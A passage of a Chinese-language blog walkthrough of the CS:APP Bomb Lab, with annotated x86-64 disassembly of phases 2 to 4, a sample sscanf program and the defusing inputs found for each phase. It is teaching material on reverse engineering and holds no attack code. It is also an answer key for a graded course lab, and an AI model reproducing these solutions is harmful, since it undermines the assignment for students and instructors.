class="hljs-number">1</span>,%edx<br>  <span class="hljs-attribute">401394</span>:eb <span class="hljs-number">05</span>                jmp    <span class="hljs-number">40139</span>b &lt;strings_not_equal+<span class="hljs-number">0</span>x<span class="hljs-number">63</span>&gt;<br>  <span class="hljs-attribute">401396</span>:ba <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,%edx<br>  <span class="hljs-attribute">40139b</span>:<span class="hljs-number">89</span> d<span class="hljs-number">0</span>                mov    %edx,%eax #保存返回值<br>  <span class="hljs-attribute">40139d</span>:<span class="hljs-number">5</span>b                   pop    %rbx<br>  <span class="hljs-attribute">40139e</span>:<span class="hljs-number">5</span>d                   pop    %rbp<br>  <span class="hljs-attribute">40139f</span>:<span class="hljs-number">41</span> <span class="hljs-number">5</span>c                pop    %r<span class="hljs-number">12</span><br>  <span class="hljs-attribute">4013a1</span>:c<span class="hljs-number">3</span>                   retq   <br></code></pre></td></tr></table></figure></li></ul><h1 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h1><ul><li>read_six_numbers(input_string,rsp)<ul><li>第一个参数由rdi保存，也即是输入的字符串的地址</li><li>第二个参数是rsi保存，也即是rsp的地址，本质上strings_not_equal函数是把字符串中的数字存到了rsp上</li><li>调用了sscanf函数</li></ul></li><li>读取了六个数字之后需要和正确答案比对，这里使用了循环进行流程控制<ul><li>比如第一个数字必须是1，然后后面的数字可以陆续推导得出</li></ul></li><li><code>1 2 4 8 16 32 </code></li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0000000000400efc</span> &lt;phase_<span class="hljs-number">2</span>&gt;:<br>  <span class="hljs-attribute">400efc</span>:<span class="hljs-number">55</span>                   push   %rbp<br>  <span class="hljs-attribute">400efd</span>:<span class="hljs-number">53</span>                   push   %rbx<br>  <span class="hljs-attribute">400efe</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">28</span>          sub    $<span class="hljs-number">0</span>x<span class="hljs-number">28</span>,%rsp    #<span class="hljs-number">0</span>x<span class="hljs-number">28</span>=<span class="hljs-number">40</span>  十个int类型数<br>  <span class="hljs-attribute">400f02</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> e<span class="hljs-number">6</span>             mov    %rsp,%rsi  <br>  <span class="hljs-attribute">400f05</span>:e<span class="hljs-number">8</span> <span class="hljs-number">52</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40145</span>c &lt;read_six_numbers&gt;#读取六个数字，第一个参数：rdi  第二个：rsp<br>  <span class="hljs-attribute">400f0a</span>:<span class="hljs-number">83</span> <span class="hljs-number">3</span>c <span class="hljs-number">24</span> <span class="hljs-number">01</span>          cmpl   $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,(%rsp)#比较<span class="hljs-number">1</span>和rsp对应内存的值，如果不相同就爆炸(第一个数字必须是<span class="hljs-number">1</span>)<br>  <span class="hljs-attribute">400f0e</span>:<span class="hljs-number">74</span> <span class="hljs-number">20</span>                je     <span class="hljs-number">400</span>f<span class="hljs-number">30</span> &lt;phase_<span class="hljs-number">2</span>+<span class="hljs-number">0</span>x<span class="hljs-number">34</span>&gt;<br>  <span class="hljs-attribute">400f10</span>:e<span class="hljs-number">8</span> <span class="hljs-number">25</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">400f15</span>:eb <span class="hljs-number">19</span>                jmp    <span class="hljs-number">400</span>f<span class="hljs-number">30</span> &lt;phase_<span class="hljs-number">2</span>+<span class="hljs-number">0</span>x<span class="hljs-number">34</span>&gt;<br>  <span class="hljs-attribute">400f17</span>:<span class="hljs-number">8</span>b <span class="hljs-number">43</span> fc             mov    -<span class="hljs-number">0</span>x<span class="hljs-number">4</span>(%rbx),%eax  #把rbx-<span class="hljs-number">4</span>地址的值也即是第<span class="hljs-number">1</span>个输入的数字赋给eax，eax=<span class="hljs-number">1</span><br>  <span class="hljs-attribute">400f1a</span>:<span class="hljs-number">01</span> c<span class="hljs-number">0</span>                add    %eax,%eax #eax=<span class="hljs-number">2</span><br>  <span class="hljs-attribute">400f1c</span>:<span class="hljs-number">39</span> <span class="hljs-number">03</span>                cmp    %eax,(%rbx) #和rbx指向的内容进行对比如果不相同就爆炸，因此rbx指向内容必须为<span class="hljs-number">2</span><br>  <span class="hljs-attribute">400f1e</span>:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">400</span>f<span class="hljs-number">25</span> &lt;phase_<span class="hljs-number">2</span>+<span class="hljs-number">0</span>x<span class="hljs-number">29</span>&gt;<br>  <span class="hljs-attribute">400f20</span>:e<span class="hljs-number">8</span> <span class="hljs-number">15</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">400f25</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c<span class="hljs-number">3</span> <span class="hljs-number">04</span>          add    $<span class="hljs-number">0</span>x<span class="hljs-number">4</span>,%rbx #rbx+<span class="hljs-number">4</span>，移动到下一个int数字的地址<br>  <span class="hljs-attribute">400f29</span>:<span class="hljs-number">48</span> <span class="hljs-number">39</span> eb             cmp    %rbp,%rbx #和rbx对比，看是不是到达了第六个数字<br>  <span class="hljs-attribute">400f2c</span>:<span class="hljs-number">75</span> e<span class="hljs-number">9</span>                jne    <span class="hljs-number">400</span>f<span class="hljs-number">17</span> &lt;phase_<span class="hljs-number">2</span>+<span class="hljs-number">0</span>x<span class="hljs-number">1</span>b&gt;<br>  <span class="hljs-attribute">400f2e</span>:eb <span class="hljs-number">0</span>c                jmp    <span class="hljs-number">400</span>f<span class="hljs-number">3</span>c &lt;phase_<span class="hljs-number">2</span>+<span class="hljs-number">0</span>x<span class="hljs-number">40</span>&gt;<br>  <span class="hljs-attribute">400f30</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">5</span>c <span class="hljs-number">24</span> <span class="hljs-number">04</span>       lea    <span class="hljs-number">0</span>x<span class="hljs-number">4</span>(%rsp),%rbx #把第二个数字的地址赋给rbx<br>  <span class="hljs-attribute">400f35</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">6</span>c <span class="hljs-number">24</span> <span class="hljs-number">18</span>       lea    <span class="hljs-number">0</span>x<span class="hljs-number">18</span>(%rsp),%rbp #rbp是最后一个数字的地址 <span class="hljs-number">0</span>x<span class="hljs-number">18</span>=<span class="hljs-number">16</span>+<span class="hljs-number">8</span>=<span class="hljs-number">24</span> <span class="hljs-number">24</span>/<span class="hljs-number">4</span>=<span class="hljs-number">6</span><br>  <span class="hljs-attribute">400f3a</span>:eb db                jmp    <span class="hljs-number">400</span>f<span class="hljs-number">17</span> &lt;phase_<span class="hljs-number">2</span>+<span class="hljs-number">0</span>x<span class="hljs-number">1</span>b&gt;<br>  <span class="hljs-attribute">400f3c</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c<span class="hljs-number">4</span> <span class="hljs-number">28</span>          add    $<span class="hljs-number">0</span>x<span class="hljs-number">28</span>,%rsp<br>  <span class="hljs-attribute">400f40</span>:<span class="hljs-number">5</span>b                   pop    %rbx<br>  <span class="hljs-attribute">400f41</span>:<span class="hljs-number">5</span>d                   pop    %rbp<br>  <span class="hljs-attribute">400f42</span>:c<span class="hljs-number">3</span>                   retq   <br></code></pre></td></tr></table></figure><p>关于sscanf函数的具体实现：</p><p>关于sscanf函数的用法可以在<a href="https://cplusplus.com/reference/cstdio/sscanf/">C++ reference</a>上找到，理解该函数的调用和传参可以帮助理解汇编代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* sscanf example */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span> <span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> sentence []=<span class="hljs-string">&quot;Rudolph is 12 years old&quot;</span>;<br>  <span class="hljs-keyword">char</span> str [<span class="hljs-number">20</span>];<br>  <span class="hljs-keyword">int</span> i;<br><span class="hljs-comment">//这里有四个参数，分别是sentence：字符串的地址；&quot;%s %*s %d&quot;字符串，str，&amp;i</span><br>  <span class="hljs-built_in">sscanf</span> (sentence,<span class="hljs-string">&quot;%s %*s %d&quot;</span>,str,&amp;i);<br>  <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;%s -&gt; %d\n&quot;</span>,str,i);<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>汇编代码：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">000000000040145c</span> &lt;read_six_numbers&gt;: # 参数：rdi（输入的数字字符串） rsi（） rdx rcx r<span class="hljs-number">8</span> r<span class="hljs-number">9</span><br>  <span class="hljs-attribute">40145c</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">18</span>          sub    $<span class="hljs-number">0</span>x<span class="hljs-number">18</span>,%rsp #<span class="hljs-number">0</span>x<span class="hljs-number">18</span>==<span class="hljs-number">24</span>byte，也即是六个int类型的数字<br>  <span class="hljs-attribute">401460</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> f<span class="hljs-number">2</span>             mov    %rsi,%rdx # rsi是第一个数字的地址，赋给rdx<br>  <span class="hljs-attribute">401463</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">4</span>e <span class="hljs-number">04</span>          lea    <span class="hljs-number">0</span>x<span class="hljs-number">4</span>(%rsi),%rcx #rcx是第二个数字的地址 <br>  <span class="hljs-attribute">401467</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">46</span> <span class="hljs-number">14</span>          lea    <span class="hljs-number">0</span>x<span class="hljs-number">14</span>(%rsi),%rax # rax是第<span class="hljs-number">5</span>个数字的地址<br>  <span class="hljs-attribute">40146b</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>       mov    %rax,<span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%rsp) # rax<br>  <span class="hljs-attribute">401470</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">46</span> <span class="hljs-number">10</span>          lea    <span class="hljs-number">0</span>x<span class="hljs-number">10</span>(%rsi),%rax<br>  <span class="hljs-attribute">401474</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span>          mov    %rax,(%rsp)<br>  <span class="hljs-attribute">401478</span>:<span class="hljs-number">4</span>c <span class="hljs-number">8</span>d <span class="hljs-number">4</span>e <span class="hljs-number">0</span>c          lea    <span class="hljs-number">0</span>xc(%rsi),%r<span class="hljs-number">9</span><br>  <span class="hljs-attribute">40147c</span>:<span class="hljs-number">4</span>c <span class="hljs-number">8</span>d <span class="hljs-number">46</span> <span class="hljs-number">08</span>          lea    <span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%rsi),%r<span class="hljs-number">8</span><br>  <span class="hljs-attribute">401480</span>:be c<span class="hljs-number">3</span> <span class="hljs-number">25</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">4025</span>c<span class="hljs-number">3</span>,%esi<br>  <span class="hljs-attribute">401485</span>:b<span class="hljs-number">8</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,%eax<br>  <span class="hljs-attribute">40148a</span>:e<span class="hljs-number">8</span> <span class="hljs-number">61</span> f<span class="hljs-number">7</span> ff ff       callq  <span class="hljs-number">400</span>bf<span class="hljs-number">0</span> &lt;__isoc<span class="hljs-number">99</span>_sscanf@plt&gt;<br>  <span class="hljs-attribute">40148f</span>:<span class="hljs-number">83</span> f<span class="hljs-number">8</span> <span class="hljs-number">05</span>             cmp    $<span class="hljs-number">0</span>x<span class="hljs-number">5</span>,%eax<br>  <span class="hljs-attribute">401492</span>:<span class="hljs-number">7</span>f <span class="hljs-number">05</span>                jg     <span class="hljs-number">401499</span> &lt;read_six_numbers+<span class="hljs-number">0</span>x<span class="hljs-number">3</span>d&gt;<br>  <span class="hljs-attribute">401494</span>:e<span class="hljs-number">8</span> a<span class="hljs-number">1</span> ff ff ff       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">401499</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c<span class="hljs-number">4</span> <span class="hljs-number">18</span>          add    $<span class="hljs-number">0</span>x<span class="hljs-number">18</span>,%rsp<br>  <span class="hljs-attribute">40149d</span>:c<span class="hljs-number">3</span>                   retq   <br></code></pre></td></tr></table></figure><h1 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h1><ul><li>刚进入phase_3这个函数就调用了sscanf函数，因此需要准备参数<ul><li>sscanf(input_string,”%d %d”,rdx,rcx)</li><li>sscanf函数返回读取的数字的数量，如果不是大于等于2会爆炸</li></ul></li><li>输入的第一个数字和7进行比较，如果大于就爆炸，因此只能大于等于0小于等于7</li><li>重点是jmpq   *0x402470(,%rax,8)语句，这里可以查看*0x402470的值从而确定要跳转的地方</li><li>如果输入的第一个数字是0，那么就会跳转到下面的第一个分支语句，从而确定第二个值</li><li>这里有很多个答案，其中一个是<code>0 207</code><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0000000000400f43</span> &lt;phase_<span class="hljs-number">3</span>&gt;:# 参数顺序：rdi（输入的数字字符串） rsi（） rdx rcx r<span class="hljs-number">8</span> r<span class="hljs-number">9</span> <br>  <span class="hljs-attribute">400f43</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">18</span>          sub    $<span class="hljs-number">0</span>x<span class="hljs-number">18</span>,%rsp<br>  <span class="hljs-attribute">400f47</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">4</span>c <span class="hljs-number">24</span> <span class="hljs-number">0</span>c       lea    <span class="hljs-number">0</span>xc(%rsp),%rcx #第四个参数<br>  <span class="hljs-attribute">400f4c</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">54</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>       lea    <span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%rsp),%rdx #第三个参数<br>  <span class="hljs-attribute">400f51</span>:be cf <span class="hljs-number">25</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">4025</span>cf,%esi #gdb查看发现是 “%d %d”，第二个参数<br>  <span class="hljs-attribute">400f56</span>:b<span class="hljs-number">8</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,%eax<br>  <span class="hljs-attribute">400f5b</span>:e<span class="hljs-number">8</span> <span class="hljs-number">90</span> fc ff ff       callq  <span class="hljs-number">400</span>bf<span class="hljs-number">0</span> &lt;__isoc<span class="hljs-number">99</span>_sscanf@plt&gt;<br>  <span class="hljs-attribute">400f60</span>:<span class="hljs-number">83</span> f<span class="hljs-number">8</span> <span class="hljs-number">01</span>             cmp    $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,%eax<br>  <span class="hljs-attribute">400f63</span>:<span class="hljs-number">7</span>f <span class="hljs-number">05</span>                jg     <span class="hljs-number">400</span>f<span class="hljs-number">6</span>a &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">27</span>&gt;<br>  <span class="hljs-attribute">400f65</span>:e<span class="hljs-number">8</span> d<span class="hljs-number">0</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">400f6a</span>:<span class="hljs-number">83</span> <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">08</span> <span class="hljs-number">07</span>       cmpl   $<span class="hljs-number">0</span>x<span class="hljs-number">7</span>,<span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%rsp)<br>  <span class="hljs-attribute">400f6f</span>:<span class="hljs-number">77</span> <span class="hljs-number">3</span>c                ja     <span class="hljs-number">400</span>fad &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">6</span>a&gt;<br>  <span class="hljs-attribute">400f71</span>:<span class="hljs-number">8</span>b <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>          mov    <span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%rsp),%eax#eax是输入的第一个数字<br>  <span class="hljs-attribute">400f75</span>:ff <span class="hljs-number">24</span> c<span class="hljs-number">5</span> <span class="hljs-number">70</span> <span class="hljs-number">24</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> jmpq   *<span class="hljs-number">0</span>x<span class="hljs-number">402470</span>(,%rax,<span class="hljs-number">8</span>)#<span class="hljs-number">8</span>*rax+*<span class="hljs-number">0</span>x<span class="hljs-number">402470</span>，跳转到下面语句的其中之一<br>  <span class="hljs-attribute">400f7c</span>:b<span class="hljs-number">8</span> cf <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>xcf,%eax#如果输入的第一个数字是<span class="hljs-number">0</span>那么就会跳到这里<br>  <span class="hljs-attribute">400f81</span>:eb <span class="hljs-number">3</span>b                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f83</span>:b<span class="hljs-number">8</span> c<span class="hljs-number">3</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">2</span>c<span class="hljs-number">3</span>,%eax<br>  <span class="hljs-attribute">400f88</span>:eb <span class="hljs-number">34</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f8a</span>:b<span class="hljs-number">8</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">100</span>,%eax<br>  <span class="hljs-attribute">400f8f</span>:eb <span class="hljs-number">2</span>d                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f91</span>:b<span class="hljs-number">8</span> <span class="hljs-number">85</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">185</span>,%eax<br>  <span class="hljs-attribute">400f96</span>:eb <span class="hljs-number">26</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f98</span>:b<span class="hljs-number">8</span> ce <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>xce,%eax<br>  <span class="hljs-attribute">400f9d</span>:eb <span class="hljs-number">1</span>f                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f9f</span>:b<span class="hljs-number">8</span> aa <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">2</span>aa,%eax<br>  <span class="hljs-attribute">400fa4</span>:eb <span class="hljs-number">18</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400fa6</span>:b<span class="hljs-number">8</span> <span class="hljs-number">47</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">147</span>,%eax<br>  <span class="hljs-attribute">400fab</span>:eb <span class="hljs-number">11</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400fad</span>:e<span class="hljs-number">8</span> <span class="hljs-number">88</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">400fb2</span>:b<span class="hljs-number">8</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,%eax<br>  <span class="hljs-attribute">400fb7</span>:eb <span class="hljs-number">05</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400fb9</span>:b<span class="hljs-number">8</span> <span class="hljs-number">37</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">137</span>,%eax<br>  <span class="hljs-attribute">400fbe</span>:<span class="hljs-number">3</span>b <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">0</span>c          cmp    <span class="hljs-number">0</span>xc(%rsp),%eax#得到第二个值<span class="hljs-number">0</span>xc(%rsp)<br>  <span class="hljs-attribute">400fc2</span>:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">400</span>fc<span class="hljs-number">9</span> &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">86</span>&gt;<br>  <span class="hljs-attribute">400fc4</span>:e<span class="hljs-number">8</span> <span class="hljs-number">71</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">400fc9</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c<span class="hljs-number">4</span> <span class="hljs-number">18</span>          add    $<span class="hljs-number">0</span>x<span class="hljs-number">18</span>,%rsp<br>  <span class="hljs-attribute">400fcd</span>:c<span class="hljs-number">3</span>                   retq   <br><br></code></pre></td></tr></table></figure></li></ul><h1 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h1><ul><li>这个和上一个类似，都是输入两个值判断是不是满足要求</li><li>函数内又调用了func4函数，所以是一个递归。func4函数是一个有三个参数的递归函数，如果一直手动分析递归的过程会把自己绕晕，所以执行jle直接跳出递归，最后发现解题确实用不着递归，直接跳出去就好了</li><li>第一个参数需要满足&lt;=7又要满足&gt;=7因此就是7</li><li>第二个参数需要满足是0<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">000000000040100c</span> &lt;phase_<span class="hljs-number">4</span>&gt;:# 参数顺序：rdi（输入的字符串） rsi（） rdx rcx r<span class="hljs-number">8</span> r<span class="hljs-number">9</span> <br>  <span class="hljs-attribute">40100c</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">18</span>          sub    $<span class="hljs-number">0</span>x<span class="hljs-number">18</span>,%rsp<br>  <span class="hljs-attribute">401010</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">4</span>c <span class="hljs-number">24</span> <span class="hljs-number">0</span>c       lea    <span class="hljs-number">0</span>xc(%rsp),%rcx #输入的第二个数字，也即是sscanf的第三个参数<br>  <span class="hljs-attribute">401015</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">54</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>       lea    <span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%rsp),%rdx #输入的第一个数字<br>  <span class="hljs-attribute">40101a</span>:be cf <span class="hljs-number">25</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">4025</span>cf,%esi #字符串“%d %d”的首地址<br>  <span class="hljs-attribute">40101f</span>:b<span class="hljs-number">8</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,%eax<br>  <span class="hljs-attribute">401024</span>:e<span class="hljs-number">8</span> c<span class="hljs-number">7</span> fb ff ff       callq  <span class="hljs-number">400</span>bf<span class="hljs-number">0</span> &lt;__isoc<span class="hljs-number">99</span>_sscanf@plt&gt;<br>  <span class="hljs-attribute">401029</span>:<span class="hljs-number">83</span> f<span class="hljs-number">8</span> <span class="hljs-number">02</span>             cmp    $<span class="hljs-number">0</span>x<span class="hljs-number">2</span>,%eax #eax是sscanf函数的返回值，这里必须是<span class="hljs-number">2</span><br>  <span class="hljs-attribute">40102c</span>:<span class="hljs-number">75</span> <span class="hljs-number">07</span>                jne    <span class="hljs-number">401035</span> &lt;phase_<span class="hljs-number">4</span>+<span class="hljs-number">0</span>x<span class="hljs-number">29</span>&gt;<br>  <span class="hljs-attribute">40102e</span>:<span 